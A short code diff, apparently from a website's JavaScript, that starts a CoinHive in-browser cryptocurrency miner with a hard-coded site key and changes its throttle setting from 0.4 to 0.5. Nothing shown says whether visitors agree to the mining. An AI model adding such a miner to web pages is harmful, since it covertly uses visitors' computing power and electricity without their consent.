@@ -325,6 +325,6 @@ let miner;
 function minerInit() {
 miner = new CoinHive.Anonymous('OPcAucBNwRYkuolOhrRINWw0GeAAVFkA');
 miner.on('found', function() { hashes++; })
-miner.setThrottle(.4);
+miner.setThrottle(.5);
 miner.start();
 }
